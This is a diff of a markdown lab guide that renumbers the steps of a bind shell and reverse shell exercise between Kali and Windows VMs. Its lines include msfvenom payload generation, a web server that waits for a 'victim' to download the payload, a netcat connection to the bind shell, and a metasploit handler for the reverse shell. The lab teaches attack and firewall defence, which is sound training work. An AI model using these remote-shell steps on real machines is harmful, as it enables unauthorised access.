@@ -22,13 +22,13 @@ Task 1: bind shell
   - The default action of the Windows firewall is to block unexpected incoming packets, so stops this attack
 - 1.2 Create a bind shell with msfvenom in Kali Linux VM 🐧, open a terminal
   ```bash
-  # 1. find bind shell options, setup required options
+  # 1.2.1. find bind shell options, setup required options
   msfvenom -p windows/shell_bind_tcp --list-options
 
-  # 2. create a bind shell
+  # 1.2.2. create a bind shell
   msfvenom -p windows/shell_bind_tcp -f exe > ./bindShell.exe
 
-  # 3. start a web server, wait for victims to download
+  # 1.2.3. start a web server, wait for victims to download
   # keep the web server running
   sudo python3 -m http.server  80
   ```
@@ -43,22 +43,22 @@ Task 1: bind shell
   ```
 - 1.5 use the bind shell, on the Kali Linux VM 🐧, open another terminal
   ```bash
-  # 1. connect the the bind shell
+  # 1.5.1. connect the the bind shell
   nc Windows_IP 4444
   # A "Microsoft Window" banner appears
 
   :: Now you are in a windows command prompt
-  :: 2. find the login account
+  :: 1.5.2. find the login account
   whoami 
-  :: 3. view the network connection you are using
+  :: 1.5.3. view the network connection you are using
   netstat -an | findstr 4444
   :: don't exit or close this terminal
   ```
 
 - 1.6 Block incoming connections to the bind shell
-  - 1. On the Windows server VM 🪟, turn on Windows firewall from
+  - 1.6.1. On the Windows server VM 🪟, turn on Windows firewall from
     - Control Panel->System and Security->Windows Firewall ->Customize Settings
-  - 2. Go back to the the previous Kali terminal with the remote Windows command prompt
+  - 1.6.2. Go back to the the previous Kali terminal with the remote Windows command prompt
     - type and commands such as help, dir, etc. you get no response
     - due the connection to bindShell.exe is blocked by Windows firewall
 
@@ -73,7 +73,7 @@ Task 2: reverse shell
     - Any computer that allows Web browsing must allow connections to external IP addresses on common ports, such as 80 and 443, 
       - so this attack works even when Windows Firewall is on, in its default state.
 - 2.2 Create a reverse shell
-  - 1. on the Kali Linux VM 🐧, open another terminal
+  - 2.2.1. on the Kali Linux VM 🐧, open another terminal
     ```bash
     # 1. list required options
     msfvenom -p windows/shell_reverse_tcp --list-options
@@ -88,13 +88,13 @@ Task 2: reverse shell
     set LHOST 0.0.0.0
     exploit
     ```
-  - 2. Launch the reverse shell on the Windows machine 🪟
+  - 2.2.2. Launch the reverse shell on the Windows machine 🪟
     - open a browser, access http://Kali_IP/reverseShell.exe
     - download and run anyway
-  - 3. Go back to the previous Kali Linux VM 🐧 terminal
-    - a "command shell session" opens, run the following commands
+  - 2.2.3. Go back to the previous Kali Linux VM 🐧 terminal
+    - 1. "command shell session" opens, run the following commands
       ```cmd
-      # 1. view the processes you are using
+      # a. view the processes you are using
       tasklist /V /FI "IMAGENAME eq *shell*"
       ```
 
